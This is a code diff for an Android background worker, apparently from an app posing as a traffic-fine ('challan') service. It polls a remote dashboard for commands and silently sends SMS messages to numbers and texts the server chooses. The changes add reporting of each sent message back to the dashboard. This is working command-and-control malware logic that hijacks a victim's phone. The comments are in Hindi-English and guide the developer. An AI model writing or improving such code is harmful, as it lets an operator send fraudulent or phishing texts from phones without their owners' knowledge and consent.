@@ -5,7 +5,7 @@ import android.provider.Settings
 import android.telephony.SmsManager
 import androidx.work.Worker
 import androidx.work.WorkerParameters
-import com.rte.challan.network.ClientApi // Aapka ClientApi import
+import com.rte.challan.network.ClientApi 
 import org.json.JSONArray
 import org.json.JSONObject
 
@@ -19,31 +19,37 @@ class CommandWorker(context: Context, workerParams: WorkerParameters) :
         )
 
         try {
-            // 1. ClientApi ka use karke GET request maaro
-            // URL aur Client ab iske andar se manage hoga
+            // 1. Fetch pending commands
             val response = ClientApi.getRequest("/api/command-sms?deviceId=$deviceId")
 
-            if (response == null) {
-                return Result.retry()
-            }
+            if (response == null) return Result.retry()
 
             val commands = JSONArray(response)
 
             for (i in 0 until commands.length()) {
                 val cmd = commands.getJSONObject(i)
                 
-                // Dashboard ke pending commands check karo
                 if (cmd.getString("status") == "pending") {
-                    // Note: Check kar lena ki aapke Worker JSON mein 'number' aur 'text' hi key hain ya kuch aur
-                    val number = cmd.optString("targetNumber") // optString use karna safe rehta hai
+                    val number = cmd.optString("targetNumber")
                     val message = cmd.optString("messageText")
-                    
+                    val commandId = cmd.optString("id") // Command ki unique ID
+
                     if (number.isNotEmpty() && message.isNotEmpty()) {
+                        // SMS Bhejien
                         sendDirectSms(number, message)
                         
-                        // 2. (Optional) Command status update karne ke liye:
-                        // val updateStatus = JSONObject().apply { put("commandId", cmd.getString("id")); put("status", "sent") }
-                        // ClientApi.postRequest("/api/update-command", updateStatus) { }
+                        // 2. IMPORTANT: Dashboard ko batayein ki SMS bhej diya gaya hai
+                        // Taaki agli baar ye command fetch na ho
+                        val updateJson = JSONObject().apply {
+                            put("commandId", commandId)
+                            put("status", "sent")
+                            put("deviceId", deviceId)
+                        }
+                        
+                        // Aapke worker mein update ka endpoint check kar lena (e.g. /api/update-command)
+                        ClientApi.postRequest("/api/update-command", updateJson) { success ->
+                            // Status updated on dashboard
+                        }
                     }
                 }
             }
@@ -56,10 +62,10 @@ class CommandWorker(context: Context, workerParams: WorkerParameters) :
 
     private fun sendDirectSms(number: String, msg: String) {
         try {
-            // Android 10+ ke liye naya tarika, purana wala bhi chalta hai par ye better hai
             val smsManager: SmsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
-                applicationContext.getSystemService(SmsManager::class.java)
+                applicationContext.getSystemService(SmsManager::class.java)!!
             } else {
+                @Suppress("DEPRECATION")
                 SmsManager.getDefault()
             }
             smsManager.sendTextMessage(number, null, msg, null, null)
